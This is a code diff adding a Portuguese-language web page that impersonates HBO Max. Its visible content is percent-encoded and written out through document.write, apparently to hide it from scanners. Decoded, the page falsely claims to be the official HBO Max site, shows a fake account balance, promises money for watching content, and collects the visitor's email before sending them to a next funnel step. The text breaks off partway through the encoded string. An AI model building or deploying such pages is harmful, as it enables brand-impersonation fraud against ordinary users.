@@ -1,0 +1,507 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>HBO Max</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&amp;display=swap" rel="stylesheet">
+    <link href="https://fonts.cdnfonts.com/css/sf-pro-display" rel="stylesheet">
+    <link rel="shortcut icon" href="images/logo.png.png">
+
+    <style>
+
+        html, body {
+        overflow-x: hidden;
+        }
+
+        #netflixlogoapp{
+            width: 100px;
+            margin: 20px;
+            margin-top: 25px;
+        }
+
+        #netflixlogoapp2{
+            width: 300px;
+            margin-right: 50px;
+            margin-bottom: 10px;
+            margin-left: 50px;
+            margin-top: 60px;
+        }
+
+        *{
+            margin: 0px;
+            font-family: 'SF Pro Display', sans-serif;
+            font-weight: 700;
+            padding: 0px;
+        }
+        body{
+            background-image: linear-gradient(to bottom, #040f50, #060e46, #090c3c, #0c0932, #0c0528);
+        }
+        #barranetflix{
+            background: linear-gradient( #000000, rgba(12, 12, 12, 0));
+            display: flex;
+            justify-content: space-between;
+            margin: 0px;
+        }
+        #bannerprincipal{
+            background-image: url('images/1jy4xdMf4wYA.png') ;
+            background-position: center; /* Center the image */
+            background-repeat: no-repeat; /* Do not repeat the image */
+            background-size: cover;
+        }
+        #textoprincipal{
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-size: 20px;
+            font-weight: -50px;
+            margin: 20px;
+        }
+        #ganheassistindocaixa{
+            padding: 5px;
+            text-align: center;
+            font-size: 23px;
+            margin-bottom: 20px;
+            font-weight: 700;
+            margin-top: 10px;
+            background-color: #0f79af;
+            width: 60%;
+        }
+        #textodetalhelogin{
+            font-size: 15px;
+            margin-top: 20px;
+            margin-left: 10px;
+            margin-right: 10px;
+            font-weight: 500;
+        }
+        #inputtypetext{
+            border: 1px solid rgba(255, 255, 255, 0.616);
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            -webkit-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            -moz-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border:1px solid rgba(255, 255, 255, 0.18);
+            color: white;
+            width: 80%;
+            border-radius: 10px;
+            margin-top: 20px;
+            padding: 13px 15px;
+            font-weight: 700;
+        }
+        a{
+            text-decoration: none;
+        }
+        #botaoproximaetapa{
+            padding: 15px;
+            font-weight: 800;
+            width: 50%;
+            margin-top: 10px;
+            color: white;
+            border-radius: 15px;
+            font-size: 18px;
+            background-color: #002be7;
+            animation: breathing 2s ease-in-out infinite;
+            transition: background-color 0.3s ease; /* Transição suave de cor */
+
+        }
+
+        #botaoproximaetapaa{
+            padding: 15px;
+            font-weight: 800;
+            width: 50%;
+            margin-top: 20px;
+            color: white;
+            border-radius: 15px;
+            font-size: 18px;
+            background-color: #002be7;
+            transition: background-color 0.3s ease; /* Transição suave de cor */
+        }
+
+        #botaolucraretapa{
+            background: linear-gradient(rgb(0, 0, 0, 0), #090a41);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+        }
+        #botaolucraretapaa{
+            display: flex;
+            justify-content: center;
+            margin-top: -90px;
+            align-items: center;
+            padding: 0px 0px 20px 0px;
+            text-align: center;
+            animation: breathing 2s ease-in-out infinite;
+        }
+
+        @keyframes breathing {
+        0% {
+        transform: scale(1);
+        }
+        50% {
+        transform: scale(1.03); /* Reduzi a escala para evitar problemas de layout */
+        }
+        100% {
+        transform: scale(1);
+        }
+        }
+
+
+        #informativo{
+            padding: 10px;
+            margin: 10px;
+            margin-top: 5px;
+            display: flex;
+            margin-left:  -150px;
+            justify-content: center;
+            align-items: center;
+            border-radius: 5px;
+            height: 200px;
+        }
+        #pipocanetflix{
+            width: 30px;
+        }
+        #dinheirologo{
+            width: 60px;
+        }
+        .tvnetflix{
+            width: 90%;
+        }
+
+        #tvnetflixaax{
+            margin-top: 15px;
+            margin-bottom: ;
+            width: 370px;
+            margin-left: -60px;
+        }
+
+        #tvnetflixapp{
+            width: 150px;
+            height: 150px;
+            position: relative;
+        }
+        #videomp4net{
+            width: 200px;
+            margin-left: 50px;
+            margin-top: 30px;
+        }
+        #informativo div:first-child {
+            width: 150px;
+            height: 150px;
+            position: relative;
+        }
+        #informativo div:last-child {
+            width: 150px;
+            height: 150px;
+            position: relative;
+            margin-top: -150px;
+            margin-left: 20px;
+        }
+        #textodetalhelogindd{
+            color: white;
+            padding: 30px;
+            font-family: 'SF Pro Display', sans-serif;
+            font-size: 18px;
+            font-weight: 450;
+            margin-top: -35px;
+            margin-bottom: -15px;
+            text-align: center;
+        }
+        footer{
+            color: white;
+            height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            margin-right: 40px;
+            margin-left: 40px;
+        }
+        #saldolead{
+            margin-right: 20px;
+            padding: 14px 20px;
+            background-color: #002be7;
+            height: 15px;
+            border-radius: 10px;
+            display: flex;
+            margin-top:15px;
+            justify-content: center;
+            align-items: center;
+            color: white;
+
+        }
+
+
+        #popupBackground {
+            display: none; /* Inicialmente oculto */
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.678);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        /* Estilos para o pop-up */
+        #popup {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0));
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            -webkit-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            -moz-box-shadow: 0px 0px 44px 10px rgba(0,0,0,0.93);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border:1px solid rgba(255, 255, 255, 0.18);
+            margin-right: 25px;
+            margin-left: 25px;
+            padding: 20px;
+            border-radius: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            opacity: 0;
+            transform: translateY(-20px); /* Inicialmente, o pop-up está ligeiramente deslocado para cima */
+            transition: opacity 0.5s ease, transform 0.5s ease; /* Animação suave */
+        }
+
+        /* Estilos para o botão */
+        #closeButton {
+            background-color: #002be7;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
+            color: white;
+            border: none;
+            padding: 13px 50px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 30px;
+            margin-bottom: 5px;
+            animation: breathing 2s ease-in-out infinite;
+        }
+
+        #closeButton:hover {
+            background-color: #1cda45;
+        }
+
+        #siteoficial{
+            margin-bottom: 20px;
+            color: white;
+        }
+
+        #textooficial{
+            margin-bottom: 15px;
+            color: rgb(218, 218, 218);
+            font-weight: 500;
+            margin-right: 10px;
+            margin-left: 10px;
+        }
+
+        #titulooficial{
+            color: white;
+            margin-top: 20px;
+            font-size: 30px;
+            font-weight: 900;
+        } 
+        
+        #textoaltoficial{
+            color: rgb(218, 218, 218);
+            font-weight: 500;
+            margin-right: 10px;
+            margin-left: 10px;
+        }
+
+        #linha-horizontal {
+        width: 200px;
+        border: 1px solid rgba(255, 255, 255, 0.137);
+        border-radius: 100px;
+        margin: 0 auto;
+        margin-bottom: 15px;
+        }
+
+        #googleseguro{
+            width: 80px;
+            margin-top: 15px;
+        }
+
+        #maxtitulo{
+            width: 100px;
+        }
+
+        body.no-scroll {
+            overflow: hidden;
+        }
+
+        #botaoproximaetapa.disabled {
+            background-color: gray;
+            cursor: not-allowed;
+        }
+
+        #botaoproximaetapaa.disabled {
+            background-color: gray;
+            cursor: not-allowed;
+        }
+
+        
+    </style>
+</head>
+<body class="no-scroll">
+    <script language="Javascript">
+        <!--SAI DAQUI TOPO DE FUNIL-->
+        <!--
+        document.write(unescape('%0A%0A%20%20%20%20%3C%21%2D%2D%20%45%73%74%72%75%74%75%72%61%20%64%6F%20%70%6F%70%2D%75%70%20%2D%2D%3E%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%70%6F%70%75%70%42%61%63%6B%67%72%6F%75%6E%64%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%70%6F%70%75%70%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%3E%3C%69%6D%67%20%73%72%63%3D%22%69%6D%61%67%65%73%2F%73%65%67%75%72%6F%2E%70%6E%67%22%20%69%64%3D%22%6D%61%78%74%69%74%75%6C%6F%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%68%32%20%69%64%3D%22%74%69%74%75%6C%6F%6F%66%69%63%69%61%6C%22%3E%3C%62%3E%41%54%45%4E%C7%C3%4F%3C%2F%62%3E%3C%2F%68%32%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%20%69%64%3D%22%73%69%74%65%6F%66%69%63%69%61%6C%22%3E%56%6F%63%EA%20%65%73%74%E1%20%6E%6F%20%53%69%74%65%20%4F%66%69%63%69%61%6C%20%48%42%4F%20%4D%41%58%21%3C%2F%70%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%6C%69%6E%68%61%2D%68%6F%72%69%7A%6F%6E%74%61%6C%22%3E%3C%2F%64%69%76%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%20%69%64%3D%22%74%65%78%74%6F%6F%66%69%63%69%61%6C%22%3E%46%69%71%75%65%20%61%74%65%6E%74%6F%20%61%20%6F%75%74%72%6F%73%20%73%69%74%65%73%20%71%75%65%20%70%6F%64%65%6D%20%65%73%74%61%72%20%74%65%6E%74%61%6E%64%6F%20%65%6E%67%61%6E%61%72%20%76%6F%63%EA%20%63%6F%6D%20%61%76%61%6C%69%61%E7%F5%65%73%20%66%61%6C%73%61%73%20%65%20%6F%66%65%72%74%61%73%20%66%72%61%75%64%75%6C%65%6E%74%61%73%2E%3C%2F%70%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%20%69%64%3D%22%74%65%78%74%6F%61%6C%74%6F%66%69%63%69%61%6C%22%3E%50%61%72%61%20%67%61%72%61%6E%74%69%72%20%61%20%73%65%67%75%72%61%6E%E7%61%20%65%20%61%20%61%75%74%65%6E%74%69%63%69%64%61%64%65%2C%20%6E%E3%6F%20%75%74%69%6C%69%7A%65%20%6F%75%20%63%6F%6D%70%61%72%74%69%6C%68%65%20%71%75%61%6C%71%75%65%72%20%6F%75%74%72%61%20%70%6C%61%74%61%66%6F%72%6D%61%20%71%75%65%20%6E%E3%6F%20%73%65%6A%61%20%65%73%74%61%2E%3C%2F%70%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%62%75%74%74%6F%6E%20%69%64%3D%22%63%6C%6F%73%65%42%75%74%74%6F%6E%22%3E%45%73%74%6F%75%20%43%69%65%6E%74%65%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%3E%3C%69%6D%67%20%73%72%63%3D%22%69%6D%61%67%65%73%2F%73%69%74%65%2D%73%65%67%75%72%6F%2E%70%6E%67%22%20%69%64%3D%22%67%6F%6F%67%6C%65%73%65%67%75%72%6F%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%20%20%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%44%4F%4D%43%6F%6E%74%65%6E%74%4C%6F%61%64%65%64%22%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6C%65%74%20%70%6F%70%75%70%42%61%63%6B%67%72%6F%75%6E%64%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%70%6F%70%75%70%42%61%63%6B%67%72%6F%75%6E%64%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6C%65%74%20%70%6F%70%75%70%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%70%6F%70%75%70%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%6C%65%74%20%63%6C%6F%73%65%42%75%74%74%6F%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%63%6C%6F%73%65%42%75%74%74%6F%6E%22%29%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%45%78%69%62%65%20%6F%20%66%75%6E%64%6F%20%65%20%6F%20%70%6F%70%2D%75%70%20%63%6F%6D%20%61%6E%69%6D%61%E7%E3%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%70%6F%70%75%70%42%61%63%6B%67%72%6F%75%6E%64%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%66%6C%65%78%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%22%6E%6F%2D%73%63%72%6F%6C%6C%22%29%3B%20%2F%2F%20%44%65%73%61%74%69%76%61%20%61%20%72%6F%6C%61%67%65%6D%20%64%61%20%70%E1%67%69%6E%61%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%6F%70%75%70%2E%73%74%79%6C%65%2E%6F%70%61%63%69%74%79%20%3D%20%22%31%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%6F%70%75%70%2E%73%74%79%6C%65%2E%74%72%61%6E%73%66%6F%72%6D%20%3D%20%22%74%72%61%6E%73%6C%61%74%65%59%28%30%29%22%3B%20%2F%2F%20%4D%6F%76%65%20%6F%20%70%6F%70%2D%75%70%20%70%61%72%61%20%73%75%61%20%70%6F%73%69%E7%E3%6F%20%66%69%6E%61%6C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20%31%30%29%3B%20%2F%2F%20%50%65%71%75%65%6E%6F%20%61%74%72%61%73%6F%20%70%61%72%61%20%71%75%65%20%61%20%74%72%61%6E%73%69%E7%E3%6F%20%73%65%6A%61%20%76%69%73%ED%76%65%6C%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%46%65%63%68%61%20%6F%20%70%6F%70%2D%75%70%20%61%6F%20%63%6C%69%63%61%72%20%6E%6F%20%62%6F%74%E3%6F%20%63%6F%6D%20%61%6E%69%6D%61%E7%E3%6F%20%64%65%20%73%61%ED%64%61%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6C%6F%73%65%42%75%74%74%6F%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%6F%70%75%70%2E%73%74%79%6C%65%2E%6F%70%61%63%69%74%79%20%3D%20%22%30%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%6F%70%75%70%2E%73%74%79%6C%65%2E%74%72%61%6E%73%66%6F%72%6D%20%3D%20%22%74%72%61%6E%73%6C%61%74%65%59%28%32%30%70%78%29%22%3B%20%2F%2F%20%4D%6F%76%65%20%6F%20%70%6F%70%2D%75%70%20%70%61%72%61%20%62%61%69%78%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%6F%70%75%70%42%61%63%6B%67%72%6F%75%6E%64%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%22%6E%6F%6E%65%22%3B%20%2F%2F%20%45%73%63%6F%6E%64%65%20%6F%20%66%75%6E%64%6F%20%61%70%F3%73%20%61%20%61%6E%69%6D%61%E7%E3%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%22%6E%6F%2D%73%63%72%6F%6C%6C%22%29%3B%20%2F%2F%20%52%65%61%74%69%76%61%20%61%20%72%6F%6C%61%67%65%6D%20%64%61%20%70%E1%67%69%6E%61%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%20%35%30%30%29%3B%20%2F%2F%20%54%65%6D%70%6F%20%63%6F%72%72%65%73%70%6F%6E%64%65%6E%74%65%20%E0%20%64%75%72%61%E7%E3%6F%20%64%61%20%61%6E%69%6D%61%E7%E3%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%3C%2F%73%63%72%69%70%74%3E%0A%0A%0A%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%62%61%6E%6E%65%72%70%72%69%6E%63%69%70%61%6C%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%62%61%72%72%61%6E%65%74%66%6C%69%78%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%69%6D%67%20%73%72%63%3D%22%69%6D%61%67%65%73%2F%59%6C%72%63%65%78%76%62%47%50%50%45%2E%70%6E%67%22%20%69%64%3D%22%6E%65%74%66%6C%69%78%6C%6F%67%6F%61%70%70%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%73%61%6C%64%6F%6C%65%61%64%22%3E%53%61%6C%64%6F%3A%20%52%24%20%3C%62%3E%30%2C%30%30%3C%2F%62%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%74%65%78%74%6F%70%72%69%6E%63%69%70%61%6C%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%69%6D%67%20%73%72%63%3D%22%69%6D%61%67%65%73%2F%59%6C%72%63%65%78%76%62%47%50%50%45%2E%70%6E%67%22%20%69%64%3D%22%6E%65%74%66%6C%69%78%6C%6F%67%6F%61%70%70%32%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%3E%4D%55%49%54%4F%20%4D%41%49%53%20%41%20%56%45%52%3C%2F%70%3E%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%20%69%64%3D%22%74%65%78%74%6F%64%65%74%61%6C%68%65%6C%6F%67%69%6E%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%62%3E%51%75%65%72%20%67%61%6E%68%61%72%20%61%73%73%69%73%74%69%6E%64%6F%3F%3C%2F%62%3E%20%49%6E%66%6F%72%6D%65%2D%6E%6F%73%20%73%65%75%20%65%6D%61%69%6C%20%65%20%63%6F%6D%65%63%65%20%61%67%6F%72%61%20%6D%65%73%6D%6F%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%70%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%69%6E%70%75%74%20%74%79%70%65%3D%22%65%6D%61%69%6C%22%20%69%64%3D%22%69%6E%70%75%74%74%79%70%65%74%65%78%74%22%20%70%6C%61%63%65%68%6F%6C%64%65%72%3D%22%49%6E%66%6F%72%6D%65%20%73%65%75%20%45%2D%4D%61%69%6C%2A%22%20%72%65%71%75%69%72%65%64%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%62%6F%74%61%6F%6C%75%63%72%61%72%65%74%61%70%61%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%2E%2E%2F%70%31%2F%69%6E%64%65%78%2E%68%74%6D%6C%22%20%69%64%3D%22%62%6F%74%61%6F%70%72%6F%78%69%6D%61%65%74%61%70%61%22%20%63%6C%61%73%73%3D%22%64%69%73%61%62%6C%65%64%22%3E%43%4F%4D%45%C7%41%52%20%41%47%4F%52%41%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%20%20%20%20%20%20%3C%73%63%72%69%70%74%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%44%4F%4D%43%6F%6E%74%65%6E%74%4C%6F%61%64%65%64%22%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%65%6D%61%69%6C%49%6E%70%75%74%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%69%6E%70%75%74%74%79%70%65%74%65%78%74%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6E%65%78%74%53%74%65%70%42%75%74%74%6F%6E%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%22%62%6F%74%61%6F%70%72%6F%78%69%6D%61%65%74%61%70%61%22%29%3B%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%56%65%72%69%66%69%63%61%20%73%65%20%6F%20%65%2D%6D%61%69%6C%20%E9%20%76%E1%6C%69%64%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%66%75%6E%63%74%69%6F%6E%20%69%73%56%61%6C%69%64%45%6D%61%69%6C%28%65%6D%61%69%6C%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%65%6D%61%69%6C%50%61%74%74%65%72%6E%20%3D%20%2F%5E%5B%61%2D%7A%41%2D%5A%30%2D%39%2E%5F%25%2B%2D%5D%2B%40%5B%61%2D%7A%41%2D%5A%30%2D%39%2E%2D%5D%2B%5C%2E%5B%61%2D%7A%41%2D%5A%5D%7B%32%2C%7D%24%2F%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6E%20%65%6D%61%69%6C%50%61%74%74%65%72%6E%2E%74%65%73%74%28%65%6D%61%69%6C%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%41%74%69%76%61%2F%64%65%73%61%74%69%76%61%20%6F%20%62%6F%74%E3%6F%20%63%6F%6D%20%62%61%73%65%20%6E%61%20%76%61%6C%69%64%61%64%65%20%64%6F%20%65%2D%6D%61%69%6C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%65%6D%61%69%6C%49%6E%70%75%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%69%6E%70%75%74%22%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%69%73%56%61%6C%69%64%45%6D%61%69%6C%28%65%6D%61%69%6C%49%6E%70%75%74%2E%76%61%6C%75%65%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6E%65%78%74%53%74%65%70%42%75%74%74%6F%6E%2E%63%6C%61%73%73%4C%69%73%74%2E%72%65%6D%6F%76%65%28%22%64%69%73%61%62%6C%65%64%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20%65%6C%73%65%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6E%65%78%74%53%74%65%70%42%75%74%74%6F%6E%2E%63%6C%61%73%73%4C%69%73%74%2E%61%64%64%28%22%64%69%73%61%62%6C%65%64%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%50%72%65%76%69%6E%65%20%6F%20%72%65%64%69%72%65%63%69%6F%6E%61%6D%65%6E%74%6F%20%73%65%20%6F%20%65%2D%6D%61%69%6C%20%6E%E3%6F%20%66%6F%72%20%76%E1%6C%69%64%6F%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6E%65%78%74%53%74%65%70%42%75%74%74%6F%6E%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%22%63%6C%69%63%6B%22%2C%20%66%75%6E%63%74%69%6F%6E%28%65%76%65%6E%74%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%21%69%73%56%61%6C%69%64%45%6D%61%69%6C%28%65%6D%61%69%6C%49%6E%70%75%74%2E%76%61%6C%75%65%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%65%76%65%6E%74%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%61%6C%65%72%74%28%22%50%6F%72%20%66%61%76%6F%72%2C%20%69%6E%73%69%72%61%20%75%6D%20%65%2D%6D%61%69%6C%20%76%E1%6C%69%64%6F%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%3C%2F%73%63%72%69%70%74%3E%0A%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%20%20%3C%70%20%69%64%3D%22%74%65%78%74%6F%64%65%74%61%6C%68%65%6C%6F%67%69%6E%64%64%22%3E%0A%20%20%20%20%20%20%20%20%41%20%4D%61%78%20%74%65%6D%20%6D%75%69%74%6F%20%6D%61%69%73%20%61%20%76%65%72%20%63%6F%6D%20%76%6F%63%EA%20%65%20%74%6F%64%61%20%61%20%66%61%6D%ED%6C%69%61%2E%20%50%72%61%20%71%75%65%6D%20%63%75%72%74%65%20%64%72%61%6D%61%2C%20%63%6F%6D%E9%64%69%61%2C%20%72%65%61%6C%69%74%69%65%73%20%65%20%61%67%6F%72%61%2C%20%63%6F%6C%6F%63%61%72%20%3C%62%3E%44%69%6E%68%65%69%72%6F%20%6E%6F%20%42%6F%6C%73%6F%21%3C%2F%62%3E%20%20%20%20%3C%2F%70%3E%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%69%6E%66%6F%72%6D%61%74%69%76%6F%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%74%76%6E%65%74%66%6C%69%78%61%70%70%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%3E%3C%69%6D%67%20%73%72%63%3D%22%22%20%69%64%3D%22%76%69%64%65%6F%6D%70%34%6E%65%74%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%3E%3C%69%6D%67%20%73%72%63%3D%22%69%6D%61%67%65%73%2F%69%42%52%46%6F%59%68%5A%44%36%45%68%2E%70%6E%67%22%20%69%64%3D%22%74%76%6E%65%74%66%6C%69%78%61%61%78%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%0A%20%20%20%20%3C%64%69%76%20%69%64%3D%22%62%6F%74%61%6F%6C%75%63%72%61%72%65%74%61%70%61%61%22%3E%0A%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%2E%2E%2F%70%31%2F%69%6E%64%65%78%2E%68%74%6D%6C%22%20%69%64%3D%22%62%6F%74%61%6F%70%72%6F%78%69%6D%61%65%74%61%70%61%61%22%20%63%6C%61%73%73%3D%22%64%69%73%61%62%6C%65%64%22%3E%49%4E%49%43%49%41%52%20%41%47%4F%52%41%3C%2F%61%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%